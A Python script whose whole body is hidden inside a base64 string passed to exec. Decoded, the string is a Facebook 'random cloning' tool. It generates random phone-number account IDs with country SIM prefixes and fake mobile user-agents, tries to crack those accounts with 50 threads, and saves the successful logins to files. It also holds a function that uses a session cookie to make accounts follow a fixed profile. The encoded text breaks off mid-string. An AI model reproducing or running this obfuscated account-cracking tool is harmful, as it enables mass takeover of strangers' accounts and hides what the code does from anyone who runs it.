#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: U7P4L 1N
#______GITHUB : https://github.com/U7P4L-IN
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'Iy0tLS0tLS0tLS0tLS0tLS0tLS0tSU5GTy0tLS0tLS0tLS0tLS0tLS0tLS0jDQojQ09ESU5HIEJZIE5JTE9ZDQojU0NSSVBUIFJBTkRPTSBDTE9ORSANCiNGQUNFQk9PSyA+IE5JTE9ZIEtJTkcNCiNHSVRIVUIgPiBOSUxPWTM5ODcNCiMtLS0tLS0tLS0tLS0tTUFJTj5NRU5VLS0tLS0tLS0tLS0tLSMNCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHV1aWQNCm9zLnN5c3RlbSgnY2xlYXInKQ0KZGVmIG8oKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIGlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKS50ZXh0DQogICAgamFsYW4oIiAgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtK1wwMzNbOTc7MW1dIFwwMzNbOTc7MW1JUCBBRERSRVMgXDAzM1szODs1OzE5Nm06IFwwMzNbMTszMm0iK2lwKQ0KICAgIHByaW50KCIgICAgIFwwMzNbMzg7NTs0Nm0tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzMybS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzk3bS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzM4OzU7NDZtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzM4OzU7NDZtLVwwMzNbMTs5N20tXDAzM1sxOzMybS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLSIpDQogICAgamFsYW4oIiAgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtMVwwMzNbOTc7MW1dIFwwMzNbOTc7MW1TVEFSVCBSQU5ET00gQ0xPTklORyAgICIpDQogICAgcHJpbnQoIiAgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtMlwwMzNbOTc7MW1dIFwwMzNbOTU7MW1DT05UQUNUIEFETUlOIikNCiAgICBwcmludCgiICAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW0zXDAzM1s5NzsxbV0gXDAzM1s5MjsxbUpPSU4gTVkgR1JPVVAgIikNCiAgICBOSUxPWSA9IGlucHV0KCcgICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbT9cMDMzWzk3OzFtXSBcMDMzWzk3OzFtU2VsZWN0IG1lbnUgXDAzM1szODs1OzE5Nm06ICcpDQogICAgaWYgTklMT1kgPT0gJzEnOg0KICAgICAgICBpKCkNCiAgICBpZiBOSUxPWSA9PSAnMic6DQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0RCWjI4MCcpDQogICAgaWYgTklMT1kgPT0gJzMnOg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZmFjZWJvb2suY29tL2dyb3Vwcy9EQloyODAvJykNCiAgICBpZiBOSUxPWSA9PSAnRSc6DQogICAgICAgIG9zLnN5c3RlbSgnZXhpdCcpDQogICAgICAgIHJldHVybiBOb25lDQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpvcy5zeXN0ZW0oImdpdCBwdWxsIikNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCg0KZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDE1MzE1MjU4NTE5Jywgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpDQogICAgICAgIHNlc3Npb24uZ2V0KCdodHRwczovL2ZyZWUuZmFjZWJvb2suY29tJyArIHN0cihnZXQpLCB7DQogICAgICAgICAgICAnY29va2llJzogY29raSB9LCAqKignY29va2llcycsKSkudGV4dA0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiANCmNsYXNzIGphbGFuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCiAgICAgICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wNDApDQoNCmRlZiBiYWNrKCk6DQoJbG9naW4oKQ0KTklMT1k9Ik5JTE9ZIg0KaW10PSJTRVRVIg0KYWs9IkNMQVNTMy0iDQpteWlkPXV1aWQudXVpZDQoKS5oZXhbOjhdLnVwcGVyKCkNCnRyeToNCglrZXkxID0gb3BlbignL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQnLCAncicpLnJlYWQoKQ0KZXhjZXB0Og0KCWtvaz1vcGVuKCcvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCcsICd3JykNCglrb2sud3JpdGUobXlpZCtpbXQpDQoJa29rLmNsb3NlKCkNCiAgICAgICAgICAgIA0KUkVEID0gJ1wwMzNbMzg7NTsxOTZtJw0KV0hJVEUgPSAnXDAzM1sxOzk3bScNCkdSRUVOID0gJ1wwMzNbMTszMm0nICMNCllFTExPVyA9ICdcMDMzWzE7MzNtJw0KQkxVRSA9ICdcMDMzWzE7MzRtJw0KT1JBTkdFID0gJ1wwMzNbMTszNW0nDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJDQpBID0gJ1x4MWJbMTs5MG0nICMgV0FSTkEgQUJVIEFCVQ0KQk4gPSAnXHgxYlsxOzEwN20nICMgQkVMQUtBTkcgUFVUSUgNCkJCTCA9ICdceDFiWzE7MTA2bScgIyBCRUxBS0FORyBCSVJVIExBTkdJVA0KQlAgPSAnXHgxYlsxOzEwNW0nICMgQkVMQUtBTkcgUElOSw0KQkIgPSAnXHgxYlsxOzEwNG0nICMgQkVMQUtBTkcgQklSVQ0KQksgPSAnXHgxYlsxOzEwM20nICMgQkVMQUtBTkcgS1VOSU5HDQpCSCA9ICdceDFiWzE7MTAybScgIyBCRUxBS0FORyBISUpBVQ0KQk0gPSAnXHgxYlsxOzEwMW0nICMgQkVMQUpBTkcgTUVSQUgNCkJBID0gJ1x4MWJbMTsxMDBtJyAjIEJFTEFLQU5HIEFCVSBBQlUNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpiaSA9IHJhbmRvbS5jaG9pY2UoW00sTixLLEIsVV0pDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpsb2dvID0oIiIiJydcMzNbbQ0KIFx4MWJbMzg7NTs0Nm0g4paI4paI4paIICAgIOKWiOKWiCDilojilogg4paI4paIICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paIICAgIOKWiOKWiCANCiAgXHgxYlszODs1OzQ3beKWiOKWiOKWiOKWiCAgIOKWiOKWiCDilojilogg4paI4paIICAgICAg4paI4paIICAgIOKWiOKWiCAg4paI4paIICDilojiloggIA0KICBceDFiWzM4OzU7NDht4paI4paIIOKWiOKWiCAg4paI4paIIOKWiOKWiCDilojiloggICAgICDilojiloggICAg4paI4paIICAg4paI4paI4paI4paIICAgDQogIFx4MWJbMzg7NTs0OW3ilojiloggIOKWiOKWiCDilojilogg4paI4paIIOKWiOKWiCAgICAgIOKWiOKWiCAgICDilojiloggICAg4paI4paIICAgIA0KICBceDFiWzM4OzU7NTBt4paI4paIICAg4paI4paI4paI4paIIOKWiOKWiCDilojilojilojilojilojilojiloggIOKWiOKWiOKWiOKWiOKWiOKWiCAgICAg4paI4paIICAgIA0KXDMzWzE7OTJt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMzNbMTs5Mm3ilZEgREVWRUxPUEVSICAgIFwzM1sxOzkxbSDinYIgICAgIFx4MWJbMzg7NTs0OG1OSUxPWVwzM1sxOzkybSAgICAgICAgICAgICAgICDilZENClwzM1sxOzkybeKVkSBGQUNFQk9PSyBcMzNbMTs5MW0gICAgIOKdgiAgICAgXHgxYlszODs1OzIwOG1BTEVYIE5JTE9ZIFhIT1dESFVSWVwzM1sxOzkybSAgICAgICAgICAg4pWRDQpcMzNbMTs5Mm3ilZEgVEVBTSAgICBcMzNbMTs5MW0gICAgICDinYIgIFx4MWJbMzg7NTs0N20gICBEQVJLIFNIQURPVyBcMzNbMTs5Mm0gICAgICAgICAgICAg4pWRDQpcMzNbMTs5Mm3ilaDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilaMNClwzM1sxOzkybeKVkSBWRVJTSU9OICAgXDMzWzE7OTFtICAgIOKdgiAgICAgXHgxYlszODs1OzQ4bTMuNlwzM1sxOzkybSAgICAgICAgICAgICAgICAgICAg4pWRDQpcMzNbMTs5Mm3ilZEgVE9PTFMgICAgXDMzWzE7OTFtICAgICDinYIgICAgXHgxYlszODs1OzIwOG0gRklMRS0vUkFORE9NXDMzWzE7OTJtICAgICAgICAgICDilZENClwzM1sxOzkybeKVkSBXT1JLICAgICBcMzNbMTs5MW0gICAgIOKdgiAgICBceDFiWzM4OzU7NDdtIFdJRkkgJiBEQVRBXDMzWzE7OTJtICAgICAgICAgICAg4pWRDQpcMzNbMTs5Mm3ilZEgU1RBVFVTICBcMzNbMTs5MW0gICAgICDinYIgICAgXHgxYlszODs1OzIwOG0gUEFJRC0vRlJFRVwzM1sxOzkybSAgICAgICAgICAgICDilZENClwzM1sxOzkybeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQ0KXDMzWzE7OTJt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMzNbMTs5Mm3ilZEgV0VMQ09NRSBUTyBNWSBXT1JMRDogVEhFIFRFUk1VWCBaT05FXDMzWzE7OTJtICDilZENClwzM1sxOzkybeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSIiIikgDQp0cnk6DQogICAgcHJpbnQoIlwwMzNbMzg7NTs0Nm1cblRPT0wgVVBEQVRFIFNVQ0NFU1NGVUxcbiIpDQogICAgdGltZS5zbGVlcCgyKQ0KICAgIE5JTE9ZKCkNCiAgICBwcmludCgiXDAzM1szODs1OzE5Nm1cbllPVVIgREVWSUNFIElTIE5PVCBTVVBQT1JURUQhXG4iKQ0KICAgIE5JTE9ZKCkNCiAgICB2ID0gNS4yDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIHVwZGF0ZSA9ICgnNS4yJykNCiAgICBpZiBzdHIodikgaW4gdXBkYXRlOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBlbHNlOnBhc3MNCmV4Y2VwdDpwcmludCgnXG5cMDMzWzE7MzFtUFJPQkxFTSBJTlRFUk5FVCBDT05ORUNUSU9OLCBDSEVDSyBBTkQgVFJZIEFHQUlOXDAzM1swOzkybScpDQoNCg0KbG9vcCA9IDANCm9rcyA9IFtdDQpjcHMgPSBbXQ0KIA0KZGVmIGNsZWFyKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0DQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQpsdHggPSBpbnQobHQoKVszXSkNCmlmIGx0eCA+IDEyOg0KICAgIGEgPSBsdHgtMTINCiAgICB0YWcgPSAiUE0iDQplbHNlOg0KICAgIGEgPSBsdHgNCiAgICB0YWcgPSAiQU0iDQogICAgDQogICAgDQp0cnk6DQogICAgcHJpbnQoJ1xuXG5cMDMzWzE7MzNtTG9hZGluZyBhc3NldCBmaWxlcyAuLi4gXDAzM1swOzk3bScpDQogICAgdiA9IDUuMg0KICAgIHVwZGF0ZSA9ICgnNS4yJykNCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgaWYgc3RyKHYpIGluIHVwZGF0ZToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgZWxzZTpwYXNzDQpleGNlcHQ6cHJpbnQoJ1xuXDAzM1sxOzMxbU5vIGludGVybmV0IGNvbm5lY3Rpb24gLi4uIFwwMzNbMDs5N20nKQ0KI2dsb2JhbCBmdW5jdGlvbnMNCmRlZiBkeW5hbWljKHRleHQpOg0KICAgIHRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnLCcuLi4uICddDQogICAgZm9yIG8gaW4gdGl0aWs6DQogICAgICAgIHByaW50KCdccicrdGV4dCtvKSwNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCg0KI1VzZXIgYWdlbnRzDQp1Z2VuMj1bXQ0KdWdlbj1bXQ0KDQpmb3IgeGQgaW4gcmFuZ2UoOTg2MDUpOg0KICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJywnMTQnLCcxNScsJzE2JywnMTcnLCcxOCcsJzE5JywnMjAnXSkNCiAgICBjPScgZW4tdXM7IEdULScNCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpDQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvJw0KICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg3MywxMDApDQogICAgaT0nMCcNCiAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQ0KICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApDQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnDQogICAgdWFrdTI9KGYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScpDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQogICAgDQpkZWYgaSgpOg0KICAgIHVzZXI9W10NCiAgICB0d2YgPVtdDQogICAgb3MuZ2V0dWlkDQogICAgb3MuZ2V0ZXVpZA0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcHJpbnQoIiAgICAgICAgICAgIFwwMzNbMTs5Mm04IERJR0lUIFwwMzNbMTs5NW1DTE9OSU5HIFwwMzNbOTc7MW1bXDAzM1s5MjsxbUVOSk9ZXDAzM1s5NzsxbV0iKQ0KICAgIHByaW50KCIgICAgXDAzM1szODs1OzQ2bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1szODs1OzE5Nm0tXDAzM1szODs1OzQ2bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1szODs1OzE5Nm0tXDAzM1szODs1OzQ2bS1cMDMzWzE7MzJtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7OTdtLVwwMzNbMTszM20tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzk3bS1cMDMzWzE7MzJtLVwwMzNbMTszM20tXDAzM1szODs1OzE5Nm0tIikNCiAgICBwcmludCgnICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbeKAolwwMzNbOTc7MW1dXDAzM1sxOzk3bVBLIENPREUgICAgXDAzM1szODs1OzE5Nm06XDAzM1sxOzk3bSA5MjMwMSA5MjMwMiA5MjMwMyA5MjMwNScpDQogICAgcHJpbnQoJyAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW3igKJcMDMzWzk3OzFtXVwwMzNbMTs5N21CRCBDT0RFICAgIFwwMzNbMzg7NTsxOTZtOlwwMzNbMTs5N20gODgwMTYgODgwMTcgODgwMTggODgwMTknKQ0KICAgIHByaW50KCIgICAgXDAzM1szODs1OzQ2bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1szODs1OzE5Nm0tXDAzM1szODs1OzQ2bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzE7MzJtLVwwMzNbMTs5N20tXDAzM1szODs1OzE5Nm0tXDAzM1szODs1OzQ2bS1cMDMzWzE7MzJtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7OTdtLVwwMzNbMTszM20tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzk3bS1cMDMzWzE7MzJtLVwwMzNbMTszM20tXDAzM1szODs1OzE5Nm0tIikNCiAgICBjb2RlID0gaW5wdXQoJyAgICBcMDMzWzM4OzU7MTk2bUlOUFVUIENPREUgXDAzM1sxOzk3bTogJykNCiAgICBwcmludCgiIikNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIHByaW50KCIgICAgICAgICAgICAgXDAzM1sxOzk3bVtcMDMzWzE7MzNtTCBJIE0gSSBUICBNIEUgTiBVIFwwMzNbMTs5N21dIikNCiAgICBwcmludCgiICAgIFwwMzNbMzg7NTs0Nm0tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzMybS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzk3bS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzM4OzU7NDZtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzM4OzU7NDZtLVwwMzNbMTs5N20tXDAzM1sxOzMybS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLSIpDQogICAgcHJpbnQoIiAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW0rXDAzM1s5NzsxbV0gXDAzM1sxOzk3bUVYQU1QTEUgICAgICBcMDMzWzM4OzU7MTk2bTogXDAzM1sxOzM1bTEwMDAwXDAzM1sxOzk3bSAsIFwwMzNbMTszNG0yMDAwMFwwMzNbMTs5N20gLCBcMDMzWzE7MzJtMzAwMDAiKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KCIgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtP1wwMzNbOTc7MW1dIFwwMzNbMTs5N21DUkFDSyBJRCBMSU1JVCBcMDMzWzM4OzU7MTk2bTogXDAzM1sxOzMybSIpKQ0KICAgIA0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTUwKSBhcyBzZXR1Og0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgamFsYW4oJyAgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtK1wwMzNbOTc7MW1dIFwwMzNbOTI7MW1BR0VOVFMgICAgXDAzM1szODs1OzE5Nm06IFwwMzNbMTszMm0nK3N0cihsZW4odWdlbikpKQ0KICAgICAgICBqYWxhbignICAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW0rXDAzM1s5NzsxbV0gXDAzM1s5MjsxbVNJTSBDT0RFICBcMDMzWzM4OzU7MTk2bTogXDAzM1sxOzMybScrY29kZSkNCiAgICAgICAgamFsYW4oJyAgICAgXDAzM1s5NzsxbVtcMDMzWzkyOzFtK1wwMzNbOTc7MW1dIFwwMzNbOTI7MW1DUkFDSyBJRCAgXDAzM1szODs1OzE5Nm06IFwwMzNbMTszMm0nK3RsKQ0KICAgICAgICBwcmludCgnICAgICBcMDMzWzk3OzFtW1wwMzNbOTI7MW0rXDAzM1s5NzsxbV0gXDAzM1s5MzsxbUZJTEUgU0FWRSBcMDMzWzM4OzU7MTk2bTogXDAzM1szODs1OzQ2bU5JTE9ZLVhELU9LLnR4dCcpDQogICAgICAgIHByaW50KCcgICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbStcMDMzWzk3OzFtXSBcMDMzWzkzOzFtRklMRSBTQVZFIFwwMzNbMzg7NTsxOTZtOiBcMDMzWzM4OzU7MTk2bU5JTE9ZLVhELUNQLnR4dCcpDQogICAgICAgIHByaW50KCIgICAgIFwwMzNbMzg7NTs0Nm0tXDAzM1szODs1OzE5Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzM1bS1cMDMzWzE7MzRtLVwwMzNbMTszM20tXDAzM1sxOzMybS1cMDMzWzE7OTdtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMzg7NTs0Nm0tXDAzM1sxOzMybS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzk3bS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszNW0tXDAzM1sxOzM0bS1cMDMzWzE7MzNtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzM4OzU7MTk2bS1cMDMzWzM4OzU7NDZtLVwwMzNbMzg7NTsxOTZtLVwwMzNbMTszMm0tXDAzM1sxOzk3bS1cMDMzWzE7MzVtLVwwMzNbMTszNG0tXDAzM1sxOzMzbS1cMDMzWzM4OzU7NDZtLVwwMzNbMTs5N20tXDAzM1sxOzMybS1cMDMzWzE7MzNtLVwwMzNbMzg7NTsxOTZtLSIpDQogICAgICAgIGphbGFuKCIgICAgIFwwMzNbOTc7MW1bXDAzM1s5MjsxbeKck1wwMzNbOTc7MW1dIFwwMzNbMTs5N21GSVJTVCBcMDMzWzE7MzRtW1wwMzNbMTszMm1PTlwwMzNbMTs5N20vXDAzM1szODs1OzE5N